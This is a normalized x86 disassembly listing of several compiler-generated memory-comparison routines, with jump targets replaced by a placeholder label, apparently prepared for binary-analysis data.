adc eax 0x0
mov edx [ esp + 0x14 ]
adc edx 0x0
jmp r-xdata
leave
retn
sub_448ec5
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
movzx ecx [ eax ]
mov eax [ ebp + 0xc ]
movzx eax [ eax ]
sub ecx eax
je r-xdata
mov eax ecx
pop ebp
retn
xor eax eax
test ecx ecx
setg al
lea ecx [ eax * 2 - 0x1 ]
sub_448eea
push ebp
mov ebp esp
mov ecx [ ebp + 0x8 ]
mov edx [ ebp + 0xc ]
mov eax [ ecx ]
cmp eax [ edx ]
je r-xdata
xor eax eax
pop ebp
retn
push esi
movzx esi al
movzx eax [ edx ]
sub esi eax
je r-xdata
movzx esi [ ecx + 0x1 ]
movzx eax [ edx + 0x1 ]
sub esi eax
je r-xdata
xor eax eax
test esi esi
setg al
lea eax [ eax * 2 - 0x1 ]
test eax eax
jne r-xdata
movzx esi [ ecx + 0x2 ]
movzx eax [ edx + 0x2 ]
sub esi eax
je r-xdata
xor eax eax
test esi esi
setg al
lea eax [ eax * 2 - 0x1 ]
test eax eax
jne r-xdata
pop esi
pop ebp
retn
movzx ecx [ ecx + 0x3 ]
movzx eax [ edx + 0x3 ]
sub ecx eax
je r-xdata
xor eax eax
test esi esi
setg al
lea eax [ eax * 2 - 0x1 ]
test eax eax
jne r-xdata
mov eax ecx
xor eax eax
test ecx ecx
setg al
lea ecx [ eax * 2 - 0x1 ]
sub_448f91
push ebp
mov ebp esp
mov ecx [ ebp + 0x8 ]
mov edx [ ebp + 0xc ]
mov ax [ ecx ]
cmp ax [ edx ]
je r-xdata
xor eax eax
pop ebp
retn
push esi
movzx esi al
movzx eax [ edx ]
sub esi eax
je r-xdata
movzx ecx [ ecx + 0x1 ]
movzx eax [ edx + 0x1 ]
sub ecx eax
je r-xdata
xor eax eax
test esi esi
setg al
lea eax [ eax * 2 - 0x1 ]
test eax eax
jne r-xdata
mov eax ecx
xor eax eax
test ecx ecx
setg al
lea ecx [ eax * 2 - 0x1 ]
pop esi
pop ebp
retn
sub_448fe2
push ebp
mov ebp esp
push ebx
mov ebx [ ebp + 0x10 ]
mov eax ebx
push esi
sub eax 0x0
je r-xdata
xor eax eax
sub eax 0x1
je r-xdata
mov eax [ ebp + 0x8 ]
movzx ecx [ eax ]
mov eax [ ebp + 0xc ]
movzx eax [ eax ]
jmp r-xdata
sub eax 0x1
je r-xdata
sub ecx eax
je r-xdata
mov edx [ ebp + 0x8 ]
mov esi [ ebp + 0xc ]
movzx ecx [ edx ]
movzx eax [ esi ]
sub ecx eax
je r-xdata
sub eax 0x1
je r-xdata
mov eax ecx
jmp r-xdata
xor eax eax
test ecx ecx
setg al
lea ecx [ eax * 2 - 0x1 ]
movzx ecx [ edx + 0x1 ]
movzx eax [ esi + 0x1 ]
jmp r-xdata
xor eax eax
test ecx ecx
setg al
lea eax [ eax * 2 - 0x1 ]
test eax eax
jne r-xdata
mov edx [ ebp + 0x8 ]
mov esi [ ebp + 0xc ]
movzx ecx [ edx ]
movzx eax [ esi ]
sub ecx eax
je r-xdata
mov edx [ ebp + 0xc ]
sub eax 0x1
je r-xdata
pop esi
pop ebx
pop ebp
retn
movzx ecx [ edx + 0x1 ]
movzx eax [ esi + 0x1 ]
sub ecx eax
je r-xdata
xor eax eax
test ecx ecx
setg al
lea eax [ eax * 2 - 0x1 ]
test eax eax
jne r-xdata
mov ecx [ ebp + 0x8 ]
movzx eax [ edx ]
movzx esi [ ecx ]
sub esi eax
je r-xdata
mov esi [ ebp + 0x8 ]
push edi
cmp ebx 0x20
jb r-xdata
movzx ecx [ edx + 0x2 ]
movzx eax [ esi + 0x2 ]
jmp r-xdata
xor eax eax
test ecx ecx
setg al
lea eax [ eax * 2 - 0x1 ]
test eax eax
jne r-xdata
movzx esi [ ecx + 0x1 ]
movzx eax [ edx + 0x1 ]
sub esi eax
je r-xdata
xor eax eax
test esi esi
setg al
lea eax [ eax * 2 - 0x1 ]
test eax eax
jne r-xdata
add esi ebx
add edx ebx
cmp ebx 0x1f
ja r-xdata
mov eax [ esi ]
cmp eax [ edx ]
je r-xdata
movzx esi [ ecx + 0x2 ]
movzx eax [ edx + 0x2 ]
sub esi eax
je r-xdata
xor eax eax
test esi esi
setg al
lea eax [ eax * 2 - 0x1 ]
test eax eax
jne r-xdata
xor ecx ecx
jmp [ ebx * 4 + jump_table_44a6e2 ]
xor ecx ecx
movzx edi al
movzx eax [ edx ]
sub edi eax
je r-xdata
movzx ecx [ ecx + 0x3 ]
movzx eax [ edx + 0x3 ]
xor eax eax
test esi esi
setg al
lea eax [ eax * 2 - 0x1 ]
test eax eax
jne r-xdata
mov eax [ esi - 0x1c ]
cmp eax [ edx - 0x1c ]
je r-xdata
mov eax [ esi - 0x18 ]
cmp eax [ edx - 0x18 ]
je r-xdata
mov eax [ esi - 0x14 ]
cmp eax [ edx - 0x14 ]
je r-xdata
mov eax [ esi - 0x10 ]
cmp eax [ edx - 0x10 ]
je r-xdata
mov eax [ esi - 0xc ]
cmp eax [ edx - 0xc ]
je r-xdata
mov eax [ esi - 0x8 ]
cmp eax [ edx - 0x8 ]
je r-xdata
mov eax [ esi - 0x4 ]
cmp eax [ edx - 0x4 ]
je r-xdata
mov eax [ esi - 0x1d ]
cmp eax [ edx - 0x1d ]
je r-xdata
mov eax [ esi - 0x19 ]
cmp eax [ edx - 0x19 ]
je r-xdata
mov eax [ esi - 0x15 ]
cmp eax [ edx - 0x15 ]
je r-xdata
mov eax [ esi - 0x11 ]
cmp eax [ edx - 0x11 ]
je r-xdata
mov eax [ esi - 0xd ]
cmp eax [ edx - 0xd ]
je r-xdata
mov eax [ esi - 0x9 ]
cmp eax [ edx - 0x9 ]
je r-xdata
mov eax [ esi - 0x5 ]
cmp eax [ edx - 0x5 ]
je r-xdata
movzx eax [ edx - 0x1 ]
movzx ecx [ esi - 0x1 ]
sub ecx eax
je r-xdata
mov eax [ esi - 0x1e ]
cmp eax [ edx - 0x1e ]
je r-xdata
mov eax [ esi - 0x1a ]
cmp eax [ edx - 0x1a ]
je r-xdata
mov eax [ esi - 0x16 ]
cmp eax [ edx - 0x16 ]
je r-xdata
mov eax [ esi - 0x12 ]
cmp eax [ edx - 0x12 ]
je r-xdata
mov eax [ esi - 0xe ]
cmp eax [ edx - 0xe ]
je r-xdata
mov eax [ esi - 0xa ]
cmp eax [ edx - 0xa ]
je r-xdata
mov eax [ esi - 0x6 ]
cmp eax [ edx - 0x6 ]
je r-xdata
mov ax [ esi - 0x2 ]
cmp ax [ edx - 0x2 ]
je r-xdata
mov eax [ esi - 0x1f ]
cmp eax [ edx - 0x1f ]
je r-xdata
mov eax [ esi - 0x1b ]
cmp eax [ edx - 0x1b ]
je r-xdata
mov eax [ esi - 0x17 ]
cmp eax [ edx - 0x17 ]
je r-xdata
mov eax [ esi - 0x13 ]
cmp eax [ edx - 0x13 ]
je r-xdata
mov eax [ esi - 0xf ]
cmp eax [ edx - 0xf ]
je r-xdata
mov eax [ esi - 0xb ]
cmp eax [ edx - 0xb ]
je r-xdata
mov eax [ esi - 0x7 ]
cmp eax [ edx - 0x7 ]
je r-xdata
movzx edi [ esi - 0x3 ]
movzx eax [ edx - 0x3 ]
sub edi eax
je r-xdata
mov eax ecx
pop edi
jmp r-xdata
mov eax [ esi + 0x4 ]
cmp eax [ edx + 0x4 ]
je r-xdata
movzx edi [ esi + 0x1 ]
movzx eax [ edx + 0x1 ]
sub edi eax
je r-xdata
xor ecx ecx
test edi edi
setg cl
lea ecx [ ecx * 2 - 0x1 ]
test ecx ecx
jne r-xdata
xor ecx ecx
movzx edi al
movzx eax [ edx - 0x1c ]
sub edi eax
je r-xdata
xor ecx ecx
movzx edi al
movzx eax [ edx - 0x18 ]
sub edi eax
je r-xdata
xor ecx ecx
movzx edi al
movzx eax [ edx - 0x14 ]
sub edi eax
je r-xdata
xor ecx ecx
movzx edi al
movzx eax [ edx - 0x10 ]
sub edi eax
je r-xdata
xor ecx ecx
movzx eax [ edx - 0xc ]
movzx edi [ esi - 0xc ]
sub edi eax
je r-xdata
xor ecx ecx
movzx edi al
movzx eax [ edx - 0x8 ]
sub edi eax
je r-xdata
xor ecx ecx
movzx edi al
movzx eax [ edx - 0x4 ]
sub edi eax
je r-xdata
xor ecx ecx
movzx edi al
movzx eax [ edx - 0x1d ]
sub edi eax
je r-xdata
xor ecx ecx
movzx edi al
movzx eax [ edx - 0x19 ]
sub edi eax
je r-xdata
xor ecx ecx
movzx edi al
movzx eax [ edx - 0x15 ]
sub edi eax
je r-xdata
xor ecx ecx
movzx edi al
movzx eax [ edx - 0x11 ]
sub edi eax
je r-xdata
xor ecx ecx
movzx edi al
movzx eax [ edx - 0xd ]
sub edi eax
je r-xdata
xor ecx ecx
movzx eax [ edx - 0x9 ]
movzx edi [ esi - 0x9 ]
sub edi eax
je r-xdata
xor ecx ecx
movzx edi al
movzx eax [ edx - 0x5 ]
sub edi eax
je r-xdata
xor eax eax
test ecx ecx
setg al
lea ecx [ eax * 2 - 0x1 ]
jmp r-xdata
xor ecx ecx
movzx edi al
movzx eax [ edx - 0x1e ]
sub edi eax
je r-xdata
xor ecx ecx
movzx edi al
movzx eax [ edx - 0x1a ]
sub edi eax
je r-xdata
xor ecx ecx
movzx edi al
movzx eax [ edx - 0x16 ]
sub edi eax
je r-xdata
xor ecx ecx
movzx edi al
movzx eax [ edx - 0x12 ]
sub edi eax
je r-xdata
xor ecx ecx
movzx edi al
movzx eax [ edx - 0xe ]
sub edi eax
je r-xdata
xor ecx ecx
movzx eax [ edx - 0xa ]
movzx edi [ esi - 0xa ]
sub edi eax
je r-xdata
xor ecx ecx
movzx edi al
movzx eax [ edx - 0x6 ]
sub edi eax
je r-xdata
jmp r-xdata
xor ecx ecx
movzx eax [ edx - 0x1f ]
movzx edi [ esi - 0x1f ]
sub edi eax
je r-xdata
xor ecx ecx
movzx edi al
movzx eax [ edx - 0x1b ]
sub edi eax
je r-xdata
xor ecx ecx
movzx edi al
movzx eax [ edx - 0x17 ]
sub edi eax
je r-xdata
xor ecx ecx
movzx edi al
movzx eax [ edx - 0x13 ]
sub edi eax
je r-xdata
xor ecx ecx
movzx eax [ edx - 0xf ]
movzx edi [ esi - 0xf ]
sub edi eax
je r-xdata
xor ecx ecx
movzx edi al
movzx eax [ edx - 0xb ]
sub edi eax
je r-xdata
xor ecx ecx
movzx edi al
movzx eax [ edx - 0x7 ]
sub edi eax
je r-xdata
movzx eax [ edx - 0x2 ]
movzx edi [ esi - 0x2 ]
sub edi eax
je r-xdata
xor ecx ecx
test edi edi
setg cl
lea ecx [ ecx * 2 - 0x1 ]
test ecx ecx
jne r-xdata
xor ecx ecx
movzx edi al
movzx eax [ edx + 0x4 ]
sub edi eax
je r-xdata
movzx edi [ esi + 0x2 ]
movzx eax [ edx + 0x2 ]
sub edi eax
je r-xdata
xor ecx ecx
test edi edi
setg cl
lea ecx [ ecx * 2 - 0x1 ]
test ecx ecx
jne r-xdata
movzx edi [ esi - 0x1b ]
movzx eax [ edx - 0x1b ]
sub edi eax
je r-xdata
xor ecx ecx
test edi edi
setg cl
lea ecx [ ecx * 2 - 0x1 ]
test ecx ecx
jne r-xdata
movzx edi [ esi - 0x17 ]
movzx eax [ edx - 0x17 ]
sub edi eax
je r-xdata
xor ecx ecx
test edi edi
setg cl
lea ecx [ ecx * 2 - 0x1 ]
test ecx ecx
jne r-xdata
movzx edi [ esi - 0x13 ]
movzx eax [ edx - 0x13 ]
sub edi eax
je r-xdata
xor ecx ecx
test edi edi
setg cl
lea ecx [ ecx * 2 - 0x1 ]
test ecx ecx
jne r-xdata
movzx edi [ esi - 0xf ]
movzx eax [ edx - 0xf ]
sub edi eax
je r-xdata
xor ecx ecx
test edi edi
setg cl
lea ecx [ ecx * 2 - 0x1 ]
test ecx ecx
jne r-xdata
movzx edi [ esi - 0xb ]
movzx eax [ edx - 0xb ]
sub edi eax
je r-xdata
xor ecx ecx
test edi edi
setg cl
lea ecx [ ecx * 2 - 0x1 ]
test ecx ecx
jne r-xdata
movzx edi [ esi - 0x7 ]
movzx eax [ edx - 0x7 ]
sub edi eax
je r-xdata
xor ecx ecx
test edi edi
setg cl
lea ecx [ ecx * 2 - 0x1 ]
test ecx ecx
jne r-xdata
movzx edi [ esi - 0x3 ]
movzx eax [ edx - 0x3 ]
sub edi eax
je r-xdata
xor ecx ecx
test edi edi
setg cl
lea ecx [ ecx * 2 - 0x1 ]
test ecx ecx
jne r-xdata
movzx edi [ esi - 0x1c ]
movzx eax [ edx - 0x1c ]
sub edi eax
je r-xdata
xor ecx ecx
test edi edi
setg cl
lea ecx [ ecx * 2 - 0x1 ]
test ecx ecx
jne r-xdata
movzx edi [ esi - 0x18 ]
movzx eax [ edx - 0x18 ]
sub edi eax
je r-xdata
xor ecx ecx
test edi edi
setg cl
lea ecx [ ecx * 2 - 0x1 ]
test ecx ecx
jne r-xdata
movzx edi [ esi - 0x14 ]
movzx eax [ edx - 0x14 ]
sub edi eax
je r-xdata
xor ecx ecx
test edi edi
setg cl
lea ecx [ ecx * 2 - 0x1 ]
test ecx ecx
jne r-xdata
movzx edi [ esi - 0x10 ]
movzx eax [ edx - 0x10 ]
sub edi eax
je r-xdata
xor ecx ecx
test edi edi
setg cl
lea ecx [ ecx * 2 - 0x1 ]
test ecx ecx
jne r-xdata
movzx edi [ esi - 0xc ]
movzx eax [ edx - 0xc ]
sub edi eax
je r-xdata
xor ecx ecx
test edi edi
setg cl
lea ecx [ ecx * 2 - 0x1 ]
test ecx ecx
jne r-xdata
movzx edi [ esi - 0x8 ]
movzx eax [ edx - 0x8 ]
sub edi eax
je r-xdata
xor ecx ecx
test edi edi
setg cl
lea ecx [ ecx * 2 - 0x1 ]
test ecx ecx
jne r-xdata
movzx edi [ esi - 0x4 ]
movzx eax [ edx - 0x4 ]
sub edi eax
je r-xdata
xor ecx ecx
test edi edi
setg cl
lea ecx [ ecx * 2 - 0x1 ]
test ecx ecx
jne r-xdata
movzx edi [ esi - 0x1d ]
movzx eax [ edx - 0x1d ]
sub edi eax
je r-xdata
xor ecx ecx
test edi edi
setg cl
lea ecx [ ecx * 2 - 0x1 ]
test ecx ecx
jne r-xdata
movzx edi [ esi - 0x19 ]
movzx eax [ edx - 0x19 ]
sub edi eax
je r-xdata
xor ecx ecx
test edi edi
setg cl
lea ecx [ ecx * 2 - 0x1 ]
test ecx ecx
jne r-xdata
movzx edi [ esi - 0x15 ]
movzx eax [ edx - 0x15 ]
sub edi eax
je r-xdata
xor ecx ecx
test edi edi
setg cl
lea ecx [ ecx * 2 - 0x1 ]
test ecx ecx
jne r-xdata
movzx edi [ esi - 0x11 ]
movzx eax [ edx - 0x11 ]
sub edi eax
je r-xdata
xor ecx ecx
test edi edi
setg cl
lea ecx [ ecx * 2 - 0x1 ]
test ecx ecx
jne r-xdata
movzx edi [ esi - 0xd ]
movzx eax [ edx - 0xd ]
sub edi eax
je r-xdata
xor ecx ecx
test edi edi
setg cl
lea ecx [ ecx * 2 - 0x1 ]
test ecx ecx
jne r-xdata
movzx eax [ edx - 0x9 ]
movzx edi [ esi - 0x9 ]
sub edi eax
je r-xdata
xor ecx ecx
test edi edi
setg cl
lea ecx [ ecx * 2 - 0x1 ]
test ecx ecx
jne r-xdata
movzx edi [ esi - 0x5 ]
movzx eax [ edx - 0x5 ]
sub edi eax
je r-xdata
xor ecx ecx
test edi edi
setg cl
lea ecx [ ecx * 2 - 0x1 ]
test ecx ecx
jne r-xdata
movzx edi [ esi - 0x1e ]
movzx eax [ edx - 0x1e ]
sub edi eax
je r-xdata
xor ecx ecx
test edi edi
setg cl
lea ecx [ ecx * 2 - 0x1 ]
test ecx ecx
jne r-xdata
movzx edi [ esi - 0x1a ]
movzx eax [ edx - 0x1a ]
sub edi eax
je r-xdata
xor ecx ecx
test edi edi
setg cl
lea ecx [ ecx * 2 - 0x1 ]
test ecx ecx
jne r-xdata
movzx edi [ esi - 0x16 ]
movzx eax [ edx - 0x16 ]
sub edi eax
je r-xdata
xor ecx ecx
test edi edi
setg cl
lea ecx [ ecx * 2 - 0x1 ]
test ecx ecx
jne r-xdata
movzx edi [ esi - 0x12 ]
movzx eax [ edx - 0x12 ]
sub edi eax
je r-xdata
xor ecx ecx
test edi edi
setg cl
lea ecx [ ecx * 2 - 0x1 ]
test ecx ecx
jne r-xdata
movzx edi [ esi - 0xe ]
movzx eax [ edx - 0xe ]
sub edi eax
je r-xdata
xor ecx ecx
test edi edi
setg cl
lea ecx [ ecx * 2 - 0x1 ]
test ecx ecx
jne r-xdata
movzx edi [ esi - 0xa ]
movzx eax [ edx - 0xa ]
sub edi eax
je r-xdata
xor ecx ecx
test edi edi
setg cl
lea ecx [ ecx * 2 - 0x1 ]
test ecx ecx
jne r-xdata
movzx edi [ esi - 0x6 ]
movzx eax [ edx - 0x6 ]
sub edi eax
je r-xdata
xor ecx ecx
test edi edi
setg cl
lea ecx [ ecx * 2 - 0x1 ]
test ecx ecx
jne r-xdata
xor ecx ecx
test edi edi
setg cl
lea ecx [ ecx * 2 - 0x1 ]
jmp r-xdata
mov eax [ esi + 0x8 ]
cmp eax [ edx + 0x8 ]
je r-xdata
movzx edi [ esi + 0x5 ]
movzx eax [ edx + 0x5 ]
sub edi eax
je r-xdata
test edi edi
setg cl
lea ecx [ ecx * 2 - 0x1 ]
test ecx ecx
jne r-xdata
movzx ecx [ esi + 0x3 ]
movzx eax [ edx + 0x3 ]
sub ecx eax
je r-xdata
xor ecx ecx
test edi edi
setg cl
lea ecx [ ecx * 2 - 0x1 ]
test ecx ecx
jne r-xdata
movzx edi [ esi - 0x1a ]
movzx eax [ edx - 0x1a ]
sub edi eax
je r-xdata
xor ecx ecx
test edi edi
setg cl
lea ecx [ ecx * 2 - 0x1 ]
test ecx ecx
jne r-xdata
movzx edi [ esi - 0x16 ]
movzx eax [ edx - 0x16 ]
sub edi eax
je r-xdata
xor ecx ecx
test edi edi
setg cl
lea ecx [ ecx * 2 - 0x1 ]
test ecx ecx
jne r-xdata
movzx edi [ esi - 0x12 ]
movzx eax [ edx - 0x12 ]
sub edi eax
je r-xdata
xor ecx ecx
test edi edi
setg cl
lea ecx [ ecx * 2 - 0x1 ]
test ecx ecx
jne r-xdata
movzx edi [ esi - 0xe ]
movzx eax [ edx - 0xe ]
sub edi eax
je r-xdata
xor ecx ecx
test edi edi
setg cl
lea ecx [ ecx * 2 - 0x1 ]
test ecx ecx
jne r-xdata
movzx edi [ esi - 0xa ]
movzx eax [ edx - 0xa ]
sub edi eax
je r-xdata
xor ecx ecx
test edi edi
setg cl
lea ecx [ ecx * 2 - 0x1 ]
test ecx ecx
jne r-xdata
movzx edi [ esi - 0x6 ]
movzx eax [ edx - 0x6 ]
sub edi eax
je r-xdata
xor ecx ecx
test edi edi
setg cl
lea ecx [ ecx * 2 - 0x1 ]
test ecx ecx
jne r-xdata
movzx edi [ esi - 0x2 ]
movzx eax [ edx - 0x2 ]
sub edi eax
je r-xdata
xor ecx ecx
test edi edi
setg cl
lea ecx [ ecx * 2 - 0x1 ]
test ecx ecx
jne r-xdata
movzx edi [ esi - 0x1b ]
movzx eax [ edx - 0x1b ]
sub edi eax
je r-xdata
xor ecx ecx
test edi edi
setg cl
lea ecx [ ecx * 2 - 0x1 ]
test ecx ecx
jne r-xdata
movzx edi [ esi - 0x17 ]
movzx eax [ edx - 0x17 ]
sub edi eax
je r-xdata
xor ecx ecx
test edi edi
setg cl
lea ecx [ ecx * 2 - 0x1 ]
test ecx ecx
jne r-xdata
movzx edi [ esi - 0x13 ]
movzx eax [ edx - 0x13 ]
sub edi eax
je r-xdata
xor ecx ecx
test edi edi
setg cl
lea ecx [ ecx * 2 - 0x1 ]
test ecx ecx
jne r-xdata
movzx edi [ esi - 0xf ]
movzx eax [ edx - 0xf ]
sub edi eax
je r-xdata
xor ecx ecx
test edi edi
setg cl
lea ecx [ ecx * 2 - 0x1 ]
test ecx ecx
jne r-xdata
movzx edi [ esi - 0xb ]
movzx eax [ edx - 0xb ]
sub edi eax
je r-xdata
xor ecx ecx
test edi edi
setg cl
lea ecx [ ecx * 2 - 0x1 ]
test ecx ecx
jne r-xdata
movzx edi [ esi - 0x7 ]
movzx eax [ edx - 0x7 ]
sub edi eax
je r-xdata
xor ecx ecx
test edi edi
setg cl
lea ecx [ ecx * 2 - 0x1 ]
test ecx ecx
jne r-xdata
movzx edi [ esi - 0x3 ]
movzx eax [ edx - 0x3 ]
sub edi eax
je r-xdata
xor ecx ecx
test edi edi
setg cl
lea ecx [ ecx * 2 - 0x1 ]
test ecx ecx
jne r-xdata
movzx edi [ esi - 0x1c ]
movzx eax [ edx - 0x1c ]
sub edi eax
je r-xdata
xor ecx ecx
test edi edi
setg cl
lea ecx [ ecx * 2 - 0x1 ]
test ecx ecx
jne r-xdata
movzx edi [ esi - 0x18 ]
movzx eax [ edx - 0x18 ]
sub edi eax
je r-xdata
xor ecx ecx
test edi edi
setg cl
lea ecx [ ecx * 2 - 0x1 ]
test ecx ecx
jne r-xdata
movzx edi [ esi - 0x14 ]
movzx eax [ edx - 0x14 ]
sub edi eax
je r-xdata
xor ecx ecx
test edi edi
setg cl
lea ecx [ ecx * 2 - 0x1 ]
test ecx ecx
jne r-xdata
movzx edi [ esi - 0x10 ]
movzx eax [ edx - 0x10 ]
sub edi eax
je r-xdata
xor ecx ecx
test edi edi
setg cl
lea ecx [ ecx * 2 - 0x1 ]
test ecx ecx
jne r-xdata
movzx edi [ esi - 0xc ]
movzx eax [ edx - 0xc ]
sub edi eax
je r-xdata
xor ecx ecx
test edi edi
setg cl
lea ecx [ ecx * 2 - 0x1 ]
test ecx ecx
jne r-xdata
movzx eax [ edx - 0x8 ]
movzx edi [ esi - 0x8 ]
sub edi eax
je r-xdata
xor ecx ecx
test edi edi
setg cl
lea ecx [ ecx * 2 - 0x1 ]
test ecx ecx
jne r-xdata
movzx edi [ esi - 0x4 ]
movzx eax [ edx - 0x4 ]
sub edi eax
je r-xdata
xor ecx ecx
test edi edi
setg cl
lea ecx [ ecx * 2 - 0x1 ]
test ecx ecx
jne r-xdata
movzx edi [ esi - 0x1d ]
movzx eax [ edx - 0x1d ]
sub edi eax
je r-xdata
xor ecx ecx
test edi edi
setg cl
lea ecx [ ecx * 2 - 0x1 ]
test ecx ecx
jne r-xdata
movzx edi [ esi - 0x19 ]
movzx eax [ edx - 0x19 ]
sub edi eax
je r-xdata
xor ecx ecx
test edi edi
setg cl
lea ecx [ ecx * 2 - 0x1 ]
test ecx ecx
jne r-xdata
movzx edi [ esi - 0x15 ]
movzx eax [ edx - 0x15 ]
sub edi eax
je r-xdata
xor ecx ecx
test edi edi
setg cl
lea ecx [ ecx * 2 - 0x1 ]
test ecx ecx
jne r-xdata
movzx edi [ esi - 0x11 ]
movzx eax [ edx - 0x11 ]
sub edi eax
je r-xdata
xor ecx ecx
test edi edi
setg cl
lea ecx [ ecx * 2 - 0x1 ]
test ecx ecx
jne r-xdata
movzx edi [ esi - 0xd ]
movzx eax [ edx - 0xd ]
sub edi eax
je r-xdata
xor ecx ecx
test edi edi
setg cl
lea ecx [ ecx * 2 - 0x1 ]
test ecx ecx
jne r-xdata
movzx edi [ esi - 0x9 ]
movzx eax [ edx - 0x9 ]
sub edi eax
je r-xdata
xor ecx ecx
test edi edi
setg cl
lea ecx [ ecx * 2 - 0x1 ]
test ecx ecx
jne r-xdata
movzx edi [ esi - 0x5 ]
movzx eax [ edx - 0x5 ]
sub edi eax
je r-xdata
xor ecx ecx
test edi edi
setg cl
lea ecx [ ecx * 2 - 0x1 ]
test ecx ecx
jne r-xdata
test ecx ecx
jne r-xdata
xor ecx ecx
movzx edi al
movzx eax [ edx + 0x8 ]
sub edi eax
je r-xdata
movzx edi [ esi + 0x6 ]
movzx eax [ edx + 0x6 ]
sub edi eax
je r-xdata
xor ecx ecx
test edi edi
setg cl
lea ecx [ ecx * 2 - 0x1 ]
test ecx ecx
jne r-xdata
test ecx ecx
jne r-xdata
xor eax eax
test ecx ecx
setg al
lea ecx [ eax * 2 - 0x1 ]
jmp r-xdata
movzx ecx [ esi - 0x19 ]
movzx eax [ edx - 0x19 ]
sub ecx eax
je r-xdata
xor ecx ecx
test edi edi
setg cl
lea ecx [ ecx * 2 - 0x1 ]
test ecx ecx
jne r-xdata
movzx ecx [ esi - 0x15 ]
movzx eax [ edx - 0x15 ]
sub ecx eax
je r-xdata
xor ecx ecx
test edi edi
setg cl
lea ecx [ ecx * 2 - 0x1 ]
test ecx ecx
jne r-xdata
movzx ecx [ esi - 0x11 ]
movzx eax [ edx - 0x11 ]
sub ecx eax
je r-xdata
xor ecx ecx
test edi edi
setg cl
lea ecx [ ecx * 2 - 0x1 ]
test ecx ecx
jne r-xdata
movzx ecx [ esi - 0xd ]
movzx eax [ edx - 0xd ]
sub ecx eax
je r-xdata
xor ecx ecx
test edi edi
setg cl
lea ecx [ ecx * 2 - 0x1 ]
test ecx ecx
jne r-xdata
movzx ecx [ esi - 0x9 ]
movzx eax [ edx - 0x9 ]
sub ecx eax
je r-xdata
xor ecx ecx
test edi edi
setg cl
lea ecx [ ecx * 2 - 0x1 ]
test ecx ecx
jne r-xdata
movzx ecx [ esi - 0x5 ]
movzx eax [ edx - 0x5 ]
sub ecx eax
je r-xdata
xor ecx ecx
test edi edi
setg cl
lea ecx [ ecx * 2 - 0x1 ]
test ecx ecx
jne r-xdata
movzx ecx [ esi - 0x1 ]
movzx eax [ edx - 0x1 ]
sub ecx eax
je r-xdata
xor ecx ecx
test edi edi
setg cl
lea ecx [ ecx * 2 - 0x1 ]
test ecx ecx
jne r-xdata
movzx ecx [ esi - 0x1a ]
movzx eax [ edx - 0x1a ]
sub ecx eax
je r-xdata
xor ecx ecx
test edi edi
setg cl
lea ecx [ ecx * 2 - 0x1 ]
test ecx ecx
jne r-xdata
movzx ecx [ esi - 0x16 ]
movzx eax [ edx - 0x16 ]
sub ecx eax
je r-xdata
xor ecx ecx
test edi edi
setg cl
lea ecx [ ecx * 2 - 0x1 ]
test ecx ecx
jne r-xdata
movzx ecx [ esi - 0x12 ]
movzx eax [ edx - 0x12 ]
sub ecx eax
je r-xdata
xor ecx ecx
test edi edi
setg cl
lea ecx [ ecx * 2 - 0x1 ]
test ecx ecx
jne r-xdata
movzx ecx [ esi - 0xe ]
movzx eax [ edx - 0xe ]
sub ecx eax
je r-xdata
xor ecx ecx
test edi edi
setg cl
lea ecx [ ecx * 2 - 0x1 ]
test ecx ecx
jne r-xdata
movzx ecx [ esi - 0xa ]
movzx eax [ edx - 0xa ]
sub ecx eax
je r-xdata
xor ecx ecx
test edi edi
setg cl
lea ecx [ ecx * 2 - 0x1 ]
test ecx ecx
jne r-xdata
movzx ecx [ esi - 0x6 ]
movzx eax [ edx - 0x6 ]
sub ecx eax
je r-xdata
xor ecx ecx
test edi edi
setg cl
lea ecx [ ecx * 2 - 0x1 ]
test ecx ecx
jne r-xdata
movzx ecx [ esi - 0x2 ]
movzx eax [ edx - 0x2 ]
sub ecx eax
je r-xdata
xor ecx ecx
test edi edi
setg cl
lea ecx [ ecx * 2 - 0x1 ]
test ecx ecx
jne r-xdata
movzx ecx [ esi - 0x1b ]
movzx eax [ edx - 0x1b ]
sub ecx eax
je r-xdata
xor ecx ecx
test edi edi
setg cl
lea ecx [ ecx * 2 - 0x1 ]
test ecx ecx
jne r-xdata
movzx ecx [ esi - 0x17 ]
movzx eax [ edx - 0x17 ]
sub ecx eax
je r-xdata
xor ecx ecx
test edi edi
setg cl
lea ecx [ ecx * 2 - 0x1 ]
test ecx ecx
jne r-xdata
movzx ecx [ esi - 0x13 ]
movzx eax [ edx - 0x13 ]
sub ecx eax
je r-xdata
xor ecx ecx
test edi edi
setg cl
lea ecx [ ecx * 2 - 0x1 ]
test ecx ecx
jne r-xdata
movzx ecx [ esi - 0xf ]
movzx eax [ edx - 0xf ]
sub ecx eax
je r-xdata
xor ecx ecx
test edi edi
setg cl
lea ecx [ ecx * 2 - 0x1 ]
test ecx ecx
jne r-xdata
movzx ecx [ esi - 0xb ]
movzx eax [ edx - 0xb ]
sub ecx eax
je r-xdata
xor ecx ecx
test edi edi
setg cl
lea ecx [ ecx * 2 - 0x1 ]
test ecx ecx
jne r-xdata
movzx eax [ edx - 0x7 ]
movzx ecx [ esi - 0x7 ]
sub ecx eax
je r-xdata
xor ecx ecx
test edi edi
setg cl
lea ecx [ ecx * 2 - 0x1 ]
test ecx ecx
jne r-xdata
movzx ecx [ esi - 0x3 ]
movzx eax [ edx - 0x3 ]
sub ecx eax
je r-xdata
xor ecx ecx
test edi edi
setg cl
lea ecx [ ecx * 2 - 0x1 ]
test ecx ecx
jne r-xdata
movzx ecx [ esi - 0x1c ]
movzx eax [ edx - 0x1c ]
sub ecx eax
je r-xdata
xor ecx ecx
test edi edi
setg cl
lea ecx [ ecx * 2 - 0x1 ]
test ecx ecx
jne r-xdata
movzx ecx [ esi - 0x18 ]
movzx eax [ edx - 0x18 ]
sub ecx eax
je r-xdata
xor ecx ecx
test edi edi
setg cl
lea ecx [ ecx * 2 - 0x1 ]
test ecx ecx
jne r-xdata
movzx ecx [ esi - 0x14 ]
movzx eax [ edx - 0x14 ]
sub ecx eax
je r-xdata
xor ecx ecx
test edi edi
setg cl
lea ecx [ ecx * 2 - 0x1 ]
test ecx ecx
jne r-xdata
movzx ecx [ esi - 0x10 ]
movzx eax [ edx - 0x10 ]
sub ecx eax
je r-xdata
xor ecx ecx
test edi edi
setg cl
lea ecx [ ecx * 2 - 0x1 ]
test ecx ecx
jne r-xdata
movzx ecx [ esi - 0xc ]
movzx eax [ edx - 0xc ]
sub ecx eax
je r-xdata
xor ecx ecx
test edi edi
setg cl
